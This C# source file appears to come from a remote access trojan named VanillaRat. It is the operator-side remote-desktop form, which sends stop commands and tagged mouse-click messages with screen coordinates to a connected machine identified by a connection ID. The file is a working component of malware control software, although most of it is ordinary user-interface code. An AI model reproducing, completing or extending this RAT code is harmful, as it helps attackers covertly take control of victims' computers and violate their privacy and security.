using System;
using System.Drawing;
using System.Security.Cryptography;
using System.Windows.Input;
using System.Text;
using System.Windows.Forms;
using VanillaRat.Classes;
using Color = System.Drawing.Color;

namespace VanillaRat.Forms
{
    public partial class RDC : Form
    {
        public RDC()
        {
            InitializeComponent();
            Update = true;
            DoubleBuffered = true;
        }

        public int ConnectionID { get; set; }
        private bool Update { get; set; }
        private bool Mouse { get; set; }

        //Stop remote desktop
        private void StopRD()
        {
            Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("StopRD"));
        }

        //Close form
        private void RDC_FormClosing(object sender, FormClosingEventArgs e)
        {
            Update = false;
            StopRD();
        }

        //On remote desktop load
        private void RDC_Load(object sender, EventArgs e) { }

        //Toggle mouse
        private void btnMouse_Click(object sender, EventArgs e)
        {
            Mouse = !Mouse;
        }

        //Capture double mouse click and send if mouse enabled
        private void pbDesktop_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            if (Mouse)
            {
                Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes(@"[<MOUSE>]DOUBLE[<\MOUSE>][<X>]" + e.X + @"[<\X>][<Y>]" + e.Y + @"[<\Y>]"));
            }
        }

        //Capture mouse click and send if mouse enabled
        private void pbDesktop_MouseClick(object sender, MouseEventArgs e)
        {
            if (!Mouse) return;
            switch (e.Button) {
                case MouseButtons.Left:
                    Server.MainServer.Send(ConnectionID,
                        Encoding.ASCII.GetBytes(@"[<MOUSE>]SINGLE-LEFT[<\MOUSE>][<X>]" + e.X + @"[<\X>][<Y>]" + e.Y +
                                                @"[<\Y>]"));
                    break;
                case MouseButtons.Right:
                    Server.MainServer.Send(ConnectionID,
                        Encoding.ASCII.GetBytes(@"[<MOUSE>]SINGLE-RIGHT[<\MOUSE>][<X>]" + e.X + @"[<\X>][<Y>]" + e.Y +
                                                @"[<\Y>]"));
                    break;
            }
        }


        #region Buttons

        //Gives response to button click (because its a picturebox)
        private void btnMouse_MouseDown(object sender, MouseEventArgs e)
        {
            btnMouse.BackColor = Color.FromArgb(45, 52, 54);
        }

        //Gives response to button click (because its a picturebox)
        private void btnMouse_MouseUp(object sender, MouseEventArgs e)
        {
            btnMouse.BackColor = Color.Transparent;
        }

        #endregion

    }
}